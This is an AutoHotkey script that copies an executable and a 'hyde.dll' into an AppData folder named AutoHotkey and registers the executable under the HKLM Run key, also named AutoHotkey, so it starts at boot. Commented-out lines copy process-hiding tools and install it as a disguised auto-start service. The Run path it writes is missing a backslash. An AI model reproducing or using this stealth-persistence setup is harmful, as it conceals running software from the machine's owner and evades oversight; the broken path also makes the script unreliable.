regexmatch(a_scriptdir,"^\w",match)
root:=match
filecreatedir,% A_AppData "\AutoHotkey"
filecopy,% root ":\scripts\scsnake sync\console.exe",% A_AppData "\AutoHotkey",1
;~ filecopy,% root ":\software\Hide\ProcessMagic\ProcessMagic.exe",% A_AppData "\AutoHotkey",1
;~ filecopy,% root ":\software\Hide\CreateHiddenProcess\chp.exe",% A_AppData "\AutoHotkey",1
filecopy,% root ":\scripts\scsnake sync\hyde.dll",% A_AppData "\AutoHotkey",1
;~ filecopy,% root ":\scripts\scsnake sync\hyde.exe",% A_AppData,1

regread,reg,HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,AutoHotkey
if (reg="") {
	regwrite,REG_SZ,HKLM,SOFTWARE\Microsoft\Windows\CurrentVersion\Run,AutoHotkey,% a_appdata "AutoHotkey\console.exe"
}

;~ if !fileexist(A_AppDataCommon "\AutoHotkey.cmd"){
;~ cmd=
;~ (
;~ @echo off
;~ start "%a_appdata%\console.exe"
;~ )
;~ fileappend,% cmd,% A_AppDataCommon "\AutoHotkey.cmd",utf-8
;~ filecopy,nssm.exe,% A_AppDataCommon,1
;~ }

;~ run % "nssm install AutoHotkey AutoHotkey.cmd error= ignore DisplayName= AutoHotkey start= auto",% A_AppDataCommon

;~ Run %comspec% /c "sc create AutoHotkey error= ignore binpath= """ A_AppDataCommon "\AutoHotkey.cmd"" DisplayName= AutoHotkey start= auto"
;~ Run %comspec% /c "sc config AutoHotkey start= delayed-auto"